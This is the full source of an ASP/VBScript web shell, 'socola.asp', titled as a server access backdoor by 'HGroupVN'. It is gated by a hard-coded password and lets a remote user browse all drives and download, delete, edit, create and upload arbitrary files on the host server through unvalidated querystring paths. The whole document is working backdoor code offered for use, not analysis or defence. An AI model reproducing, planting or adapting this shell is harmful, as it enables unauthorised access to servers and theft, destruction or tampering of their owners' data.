<%@ LANGUAGE="VBSCRIPT" %>
<%
 IntPass = "huynhde"
 Response.Buffer = true
 Response.Clear
 Const adTypeBinary = 1
 Dim Name,Password,Login
 If Not Session("Open") = "True" then%>
  <title>--[ 0o0 HGroupVN 0o0 ]--[ SeRvEr AccEss d00r ]--</title>
  <BODY onload="window.Introd.PassW.focus();" style="color: #6DB0E7; background-color: #000000">
  <FORM name="Introd" method="post" action="<%=RedirName%>">
  <table align=left border="0" width="250">
   <tr>
    <td align="center">
     <P><font color="#999999"><font class=normal><b>2zx + 3xy + 4yz = 9xyz
     <br>3x - 2y = z
     <br>3y - 2z = x
     <br>3z - 2x = y
     <br>Find x , y , z ?<br>
     x + y + z =</b></font>&nbsp;</font><input type=password name=PassW ID=PassW size=8>&nbsp;<input type=submit class=boton2 name=Entrar ID=Entrar value=" Enter "></P>
    </td>
   </tr>
  </table>
  </form>
  
  </BODY>
  </HTML>
  <% Session("Open") = "True"
     Response.End
  else
     if Session("Enter") = "1" then
       else	
	Login = "True"
	Password = Request.Form("Passw")
	If not Password = IntPass then Login= "False"
	If Login= "False" then
		Session.Abandon
		Response.Write "Wrong Canculation !!! <A HREF=""javascript:history.(-1)"">Please Try Again !!!"
		Response.End
	else
		Session("Enter") = "1"
	end if
      end if
   End If
 sAction=Request.QueryString("action")
 if sAction="download_file" then
  download()
 end if 
 sub Download()
  dim oStream
  dim szFileName
  szFileName=Request.QueryString("strPath") & Request.QueryString("strFile")
  set oStream=Server.CreateObject("ADODB.Stream")
   oStream.Type=1
   oStream.Open
  on error resume next
   oStream.LoadFromFile(szFileName)
  if Err.Number=0 then
   Response.AddHeader "Content-Disposition", "attachment; filename=" & FSO.GetFileName(szFileName)
   Response.AddHeader "Content-Length", oStream.Size
   Response.ContentType="bad/type"
   Response.BinaryWrite oStream.Read
  end if
  oStream.Close
  set oStream=nothing
   Destroy()
  end sub
 %>

<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
<style type=text/css>
 A:link {COLOR: #999999; TEXT-DECORATION: none; FONT-SIZE: 10pt; FONT-FAMILY: Arial, Verdana}
 A:visited {COLOR: #66CCFF; TEXT-DECORATION: none; FONT-SIZE: 10pt; FONT-FAMILY: Arial, Verdana}
 A:hover {COLOR: #FF6600; TEXT-DECORATION: underline overline; FONT-SIZE: 10pt; FONT-FAMILY: Arial, Verdana}
</style>
</head>
<body leftMargin=2 topMargin=2 style="color: #6DB0E7; background-color: #000000">
<% 	
 action=request.querystring("action") 
 Select Case action
 Case "delete_file"
  deleteFile()
 Case "download_file"
  download()
 Case "edit_file"
  edit_file()
 Case "create_folder"
  create_folder()
 Case "create_file"
  create_file()
 Case "upload_file"
  upload_file()
 Case "change_disk"
  change_disk()
 'Case else 
 End select
 if (action<>"edit_file") and (action<>"create_folder") and (action<>"create_file") and (action<>"upload_file") and (action<>"change_disk") then 
  Main_display()
 End if      
%>
<%
'------------------------------------------------------------------------------
Private Sub Main_display()
   xPath=request.querystring("strPath")
   if xPath="" then xPath=Server.MapPath("/")&"\"
   Response.Write("<table align=center cellSpacing=1 borderColorDark=#cccccc borderColorLight=#cccccc border=""1"" width=""740""><tr>") 
   Response.Write("<td bgColor=#000000 colspan=""2"">")
   Response.Write("<a href=""socola.asp?action=change_disk"">ChAnGe DiR</a> ::: ")
   Response.Write("<a href=""socola.asp?action=create_folder&strPath=" & xPath & """>CrEat nEw DiR</a> ::: ")
   Response.Write("<a href=""socola.asp?action=create_file&strPath=" & xPath & """>Born nEw File</a> ::: ")
   Response.Write("<a href=""socola.asp?action=upload_file&strPath=" & xPath & """>UpLoad File</a> ::: ")
   Response.Write("<a href=""socola.asp?"">w@ck iT d0wn</a>")
   Response.Write("</td></tr><tr>")    
   strDir = Request("strPath")
   if strDir = "" Then strDir = Server.MapPath("/")
      strParse = strDir
   if Right(strParse, 1) <> "\" Then strParse = strParse & "\"
      lngPos = InStr(1, strParse, "\")
   strOut = "<a href=""socola.asp?strPath=" & Mid(strParse, 1, lngPos) & """>&#8362; " & Left(strParse, lngPos) & "</a><br>"
   x = 2
   Do While lngPos <> 0
      oldPos = lngPos
   lngPos = InStr(oldPos + 1, strParse, "\")
   if lngPos = 0 Then Exit Do
      For y = 1 To x
         strIndent = strIndent & " "
   Next
   strOut = strOut & strIndent & "<a href=""socola.asp?strPath=" & Mid(strParse, 1, lngPos) & """>&nbsp;&#8362; " & Mid(strParse, oldPos + 1, lngPos - (oldPos + 1)) & "</a><br>"
   x = x + 2
   if lngPos = Len(strParse) Then Exit Do
      Loop
   Response.Write("<td width=""370"" valign=""top"">")
   Response.Write(strOut)
   strIndent = strIndent & " "
   Set objFSObject = CreateObject("Scripting.FileSystemObject")
   Set objFolder = objFSObject.GetFolder(strDir)
   Set colFolders = objFolder.SubFolders 
   For Each intFol in colFolders 
      strFName = intFol.name
      Response.Write(strIndent & "<a href=""socola.asp?strPath=" & intFol.Path & """>&nbsp;&nbsp;» " & strFName &"</a><br>" & vbcrlf)
   Next
   Response.Write("</td>") 
   Response.Write("<td width=""370"" valign=""top"">")
   Set colFiles = objFolder.Files
   Response.Write("<table width=""100%"" border=0 cellpadding=0 cellspacing=0>")
   For Each intF1 in colFiles
      strFName = intF1.name
      Response.write "<tr><td width=""220""><a target=""_blank"" href=""socola.asp?strPath=" & strParse & "&strFile=" & strFName & "&action=edit_file" & """>&#9834; " & strFName &"</a></td>"
      Response.write "<td width=""70"" bgColor=#000000><a href=""socola.asp?strPath=" & strParse & "&strFile=" & strFName & "&action=delete_file" & """>&#9689; " & "Delete" & "</a></td>"
      Response.write "<td width=""80"" bgColor=#000000><a href=""socola.asp?strPath=" & strParse & "&strFile=" & strFName & "&action=download_file" & """>&#9688; " & "Download" & "</a></td></tr>"
   Next
   Response.Write("</table></td></tr></table>")   
End Sub
'------------------------------------------------------------------------------
Private Sub download()
  dim oStream
  dim szFileName
  szFileName=Request.QueryString("strPath") & Request.QueryString("strFile")
  set oStream=Server.CreateObject("ADODB.Stream")
   oStream.Type=1
   oStream.Open
  on error resume next
   oStream.LoadFromFile(szFileName)
  if Err.Number=0 then
   Response.AddHeader "Content-Disposition", "attachment; filename=" & FSO.GetFileName(szFileName)
   Response.AddHeader "Content-Length", oStream.Size
   Response.ContentType="bad/type"
   Response.BinaryWrite oStream.Read
  end if
  oStream.Close
  set oStream=nothing
   Destroy() 
End sub
'------------------------------------------------------------------------------
Private Sub deletefile()
  Set objFSObject = CreateObject("Scripting.FileSystemObject") 
  objFSObject.DeleteFile(request.querystring("strPath") & request.querystring("strFile"))
  Response.redirect "socola.asp?strPath=" & request.querystring("strPath")
End sub 
'------------------------------------------------------------------------------ 
Private Sub upload_file()
  Response.Write("<table align=center cellSpacing=1 borderColorDark=#cccccc  borderColorLight=#cccccc border=""1"" width=""272"">")
  Response.Write("<tr><td bgColor=#000000>Upload File</td></tr><tr><td width=""100%"">")
  Response.Write("<form action='socola.asp?strPath=" & request.querystring("strPath") & "&action=upload_file&action_sub=save" & "' method=""post"" enctype=""multipart/form-data"" id=form name=form>")
  Response.Write("<input name=file1 type=""file"" size=""26""><br>")
  Response.Write("<input type=submit value=""                    Upload file                 ""></form>")
  Response.Write("</td></tr></table>")
  if request.querystring("action_sub")="save" then
  dim PosB, PosBBound, PosEBound, PosEHead, PosBFld, PosEFld,strPath
  dim Boundary, BBoundary, PartBHeader, PartAHeader, PartContent, PartContent2, Binary
  dim fso, fle, rst, DataString, FileName
  dim I, Length, ContType, PartName, LastPart, BCrlf, PartContentLength 
  const adLongVarBinary = 205
  const adLongVarchar = 201
  If Request.ServerVariables("REQUEST_METHOD") = "POST" Then
   ContType = Request.ServerVariables("HTTP_Content_Type") 
  If LCase(Left(ContType, 19)) = "multipart/form-data" Then 
   PosB = InStr(LCase(ContType), "boundary=")
  If PosB > 0 Then Boundary = Mid(ContType, PosB + 9)
   PosB = InStr(LCase(ContType), "boundary=") 
  If PosB > 0 then
   PosB = InStr(Boundary, ",")
  If PosB > 0 Then Boundary = Left(Boundary, PosB - 1)
  end if
   Length = CLng(Request.ServerVariables("HTTP_Content_Length"))
  End If
  If Length > 0 And Boundary <> "" Then
   Boundary = "--" & Boundary
  Binary = Request.BinaryRead(Length)
  For I=1 to len(Boundary)
   BBoundary = BBoundary & ChrB(Asc(Mid(Boundary,I,1)))
  Next
   BCrlf = ChrB(Asc(vbCr)) & ChrB(Asc(vbLf))
   PosBBound = InStrB(Binary, BBoundary)
   PosEBound = InStrB(PosBBound + LenB(BBoundary), Binary, BBoundary, 0)
  Do While (PosBBound > 0 And PosEBound > 0)
   PosEHead = InStrB(PosBBound + LenB(BBoundary), Binary, BCrlf & BCrlf)
   PartBHeader = MidB(Binary, PosBBound + LenB(BBoundary) + 2, PosEHead - PosBBound - LenB(BBoundary) - 2)	
   PartAHeader = ""
  For I=1 to lenb(PartBHeader)
   PartAHeader = PartAHeader & Chr(AscB(MidB(PartBHeader,I,1)))
  Next
  If Right(PartAHeader,1) <> ";" Then PartAHeader = PartAHeader & ";"
   PartContent = MidB(Binary, PosEHead + 4, PosEBound - (PosEHead + 4) - 2)
   PosBFld = Instr(lcase(PartAHeader),"name=")
  If PosBFld > 0 Then
   PosEFld = Instr(PosBFld,lcase(PartAHeader),";")
  If PosEFld > 0 Then
   PartName = Mid(PartAHeader,PosBFld+5,PosEFld-PosBFld-5)
  end if
  Do Until Left(PartName,1) <> """" 
   PartName = Mid(PartName,2)
  Loop
  Do Until Right(PartName,1) <> """" 
   PartName = Left(PartName,Len(PartName)-1)
  Loop
  end if
   PosBFld = Instr(lcase(PartAHeader),"filename=""")
  If PosBFld > 0 Then
   PosEFld = Instr(PosBFld + 10,lcase(PartAHeader),"""")
  If PosEFld > 0 Then
   FileName = Mid(PartAHeader,PosBFld+10,PosEFld-PosBFld-10)
  end if
  Do Until Left(FileName,1) <> """"
   FileName = Mid(FileName,2)
  Loop
  Do Until Right(FileName,1) <> """" 
   FileName = Left(FileName,Len(FileName)-1)
  Loop
  Else
   FileName = ""
  end if
  if vartype(PartContent) = 8 then 
  Set rst = CreateObject("ADODB.Recordset")
   PartContentLength = LenB(PartContent)
  if PartContentLength > 0 then
   rst.Fields.Append "data", adLongVarBinary, PartContentLength
   rst.Open
   rst.AddNew
   rst("data").AppendChunk PartContent & ChrB(0)
   rst.Update
   PartContent2 = rst("data").GetChunk(PartContentLength)
   rst.close
  set rst = nothing
  else
   PartContent2 = ChrB(0)
  End If
  else 
   PartContent2 = PartContent
  end if
   PartContentLength = LenB(PartContent2)
  if PartContentLength > 0 then
  Set rst = CreateObject("ADODB.Recordset")
   rst.Fields.Append "data", adLongVarChar, PartContentLength
   rst.Open
   rst.AddNew
   rst("data").AppendChunk PartContent2 
   rst.Update
   DataString = rst("data")
   rst.close
  set rst = nothing
  Else
   dataString = ""
  End If
  If FileName <> "" Then
   FileName = Mid(Filename,InstrRev(FileName,"\")+1)
  set fso = Server.CreateObject("Scripting.Filesystemobject")
   strPath=request.querystring("strPath")
  if strPath <> "" then
  If right(strPath,1)<>"\" then strPath= strPath & "\"
  set fle = fso.CreateTextFile(strPath & FileName)
  else
  set fle = fso.CreateTextFile(server.MapPath(FileName))
  end if 
   fle.write DataString
   fle.close
  set fle = nothing
  set fso = nothing
  else
  End If
   LastPart = MidB(Binary, PosEBound + LenB(BBoundary), 2)
  If LastPart = ChrB(Asc("-")) & ChrB(Asc("-")) Then 
   PosBBound = 0
   PosEBound = 0
  else
   PosBBound = PosEBound
   PosEBound = InStrB(PosBBound + LenB(BBoundary), Binary, BBoundary)
  End If
  loop
  end if
  end if
  Response.redirect "socola.asp?strPath=" & request.querystring("strPath")
  End if
End sub 
'------------------------------------------------------------------------------ 
Private Sub create_folder()
  Response.Write("<table align=center cellSpacing=1 borderColorDark=#cccccc  borderColorLight=#cccccc border=""1"" width=""270"">")
  Response.Write("<tr><td bgColor=#000000>CrEat nEw DiR</td></tr><tr><td width=""100%"">")
  Response.Write("<form action='socola.asp?strPath=" & request.querystring("strPath") & "&action=create_folder&action_sub=save'" & " method=""post"">")
  Response.Write("<input type=""text"" name=""newSubF"" size=""40""><br>")
  Response.Write("<input type=""submit"" name=""submitButtonName"" value=""                      CrEat!!!                      ""></form>")
  Response.Write("</td></tr></table>")
  if request.querystring("action_sub")="save" then
   strPath=request.querystring("strPath")
   Set objFSObject = CreateObject("Scripting.FileSystemObject")
   if strPath <> "" then
    If right(strPath,1)<>"/" then strPath= strPath & "/"
     objFSObject.CreateFolder(strPath & request.form("newSubF"))
    else
     objFSObject.CreateFolder(strParse & request.form("newSubF"))
    end if
   Response.redirect "socola.asp?strPath=" & request.querystring("strPath") 
  end if  
End sub 
'------------------------------------------------------------------------------ 
Private Sub create_file()
  Response.Write("<table align=center cellSpacing=1 borderColorDark=#cccccc  borderColorLight=#cccccc border=""1"" width=""270"">")
  Response.Write("<tr><td bgColor=#000000>Born nEw FiLe</td></tr><tr><td width=""100%"">")
  Response.Write("<form action='socola.asp?strPath=" & request.querystring("strPath") & "&action=create_file&action_sub=save'" & " method=""post"">")
  Response.Write("<input type=""text"" name=""newFile"" size=""40""><br>")
  Response.Write("<input type=""submit"" name=""submitButtonName"" value=""                      Born!!!                      ""></form>")
  Response.Write("</td></tr></table>")
  if request.querystring("action_sub")="save" then
   strPath=request.querystring("strPath")
   Set objFSObject = CreateObject("Scripting.FileSystemObject")
   if strPath <> "" then
    If right(strPath,1)<>"/" then strPath= strPath & "/"
     objFSObject.CreateTextFile(strPath & request.form("newFile"))
    else
     objFSObject.CreateTextFile(strParse & request.form("newFile"))
    end if
   Response.redirect "socola.asp?strPath=" & request.querystring("strPath")
  End if  
End sub 
'------------------------------------------------------------------------------ 
Private Sub edit_file()
  Set fso = Server.CreateObject("Scripting.FileSystemObject")
  File=request.querystring("strFile")
  Path=request.querystring("strPath")
  str_edit_File=Path & File
  response.write("<font color='#FFFF00'><b>" & str_edit_File & "</font></b><hr size='1'>")
  action_sub=request.querystring("action_sub")
  Set ts = fso.OpenTextFile (str_edit_File, 1, FALSE, FALSE)
  If action_sub="save" then
   Set ts = fso.CreateTextFile (str_edit_File)
   ts.Write Request.Form("FileContent")
   Set ts = fso.OpenTextFile (str_edit_File, 1, FALSE, FALSE)
   Response.Write "Cool Man !!! You've saved this file successfully !!!<hr size='1'>"
  End if
  Response.Write("<form action='socola.asp?strPath=" & Path & "&strFile=" & File & "&action=edit_file&action_sub=save' id=form_edit method=post name=form_edit>")
  Response.Write("<input id=submit1 name=submit1 type=submit value=""Save File""><br>")
  response.write("<Textarea name=FileContent cols=""90"" rows=""25"">")
   On Error Resume Next
  Response.Write Server.HTMLEncode(ts.ReadAll)
  Response.write("</Textarea></form>")
End sub 
'------------------------------------------------------------------------------
Private Sub change_disk()
  Response.Write("<table align=center cellSpacing=1 borderColorDark=#cccccc  borderColorLight=#cccccc border=""1"" width=""270"">")
  Response.Write("<tr><td bgColor=#000000>ChAnGe DiR</td></tr><tr><td width=""100%"">")
  Response.write("<form action=""socola.asp"" method=""get"">")
  Server.ScriptTimeout = 6000
  Set fsDrive = CreateObject("Scripting.FileSystemObject")
  Set drvHack = fsDrive.Drives
  For Each drvType In drvHack
     strDrives = strDrives & "<option value=""" & drvType & """>" & drvType & "</option>"
     x = x + 1
  Next
  Response.write("<Select name=""strPath"" width=""20"">")
  Response.write(strDrives)
  Response.write("</Select><br><input type=""submit"" name=""submit"" value=""                      M0ve                      ""></form>")
  Response.Write("</td></tr></table>")    
End sub
'------------------------------------------------------------------------------
Private Sub check_login()
  Response.Write("<table align=center cellSpacing=1 borderColorDark=#cccccc  borderColorLight=#cccccc border=""1"" width=""270"">")
  Response.Write("<tr><td bgColor=#000000>&#272;&#259;ng nh&#7853;p</td></tr><tr><td width=""100%"">")
  Response.Write("<form name=""Introd"" method=""post"" action=""socola.asp"">")
  Response.Write("<input size=""40"" name=name><br>")
  Response.Write("<input type=password size=""40"" name=password><br>")
  Response.Write("<input type=submit value=""&#272;&#259;ng nh&#7853;p""></form>")
  Response.Write("</td></tr></table>")  
End sub
'------------------------------------------------------------------------------ 
%>
</body>
</html>